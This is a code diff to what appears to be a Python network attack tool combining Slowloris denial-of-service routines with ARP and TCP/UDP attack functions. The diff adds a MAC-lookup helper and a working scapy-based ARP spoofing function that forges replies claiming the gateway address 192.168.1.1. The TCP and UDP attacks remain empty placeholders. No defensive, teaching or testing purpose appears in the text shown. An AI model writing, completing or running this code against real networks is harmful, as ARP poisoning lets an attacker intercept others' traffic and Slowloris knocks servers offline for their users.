@@ -38,6 +38,25 @@ def init_socket(ip: str, port, identity):
         logging.debug("Failed to create new socket: %s", e)
         return None
 
+def get_source_mac(target_ip):
+    arp_request = scapy.ARP(pdst=target_ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        return None
+
+def arp_attack(target_ip, target_mac):
+    source_mac = get_source_mac(target_ip)
+    if source_mac:
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc="192.168.1.1", hwsrc=source_mac)
+        scapy.send(packet, verbose=False)
+    else:
+        logging.warning("Failed to get source MAC address for ARP attack")
+
 def tcp_attack(target_ip, target_port):
     # Implement TCP attack logic here
     pass  # Placeholder, replace with actual code
@@ -45,10 +64,6 @@ def tcp_attack(target_ip, target_port):
 def udp_attack(target_ip, target_port):
     # Implement UDP attack logic here
     pass  # Placeholder, replace with actual code
-
-def arp_attack(target_ip, target_mac):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc="192.168.1.1")
-    scapy.send(packet, verbose=False)
 
 def slowloris_iteration(list_of_sockets):
     logging.debug("Sending keep-alive headers...")
